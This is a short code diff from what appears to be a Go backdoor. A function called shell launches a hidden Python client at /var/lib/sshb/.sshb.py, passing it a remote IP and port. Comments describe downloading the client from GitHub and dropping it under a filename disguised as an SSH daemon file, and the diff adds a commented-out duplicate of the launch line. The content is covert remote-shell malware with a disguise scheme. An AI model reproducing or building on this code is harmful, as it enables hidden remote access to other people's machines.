@@ -11,6 +11,7 @@ func shell(ip string, port string) {
 	//mkdir /var/lib/sshd/totallysshd.py
 	//curl client.py from github and drop it at /var/lib/sshd/totallysshd.py
 
+	// cmd := exec.Command("/usr/bin/python3", "/var/lib/sshb/.sshb.py", ip, port) //execute the command
 	cmd := exec.Command("/usr/bin/python3", "/var/lib/sshb/.sshb.py", ip, port) //execute the command
 	err := cmd.Run()                                                            //define err by running cmd
 	if err != nil {
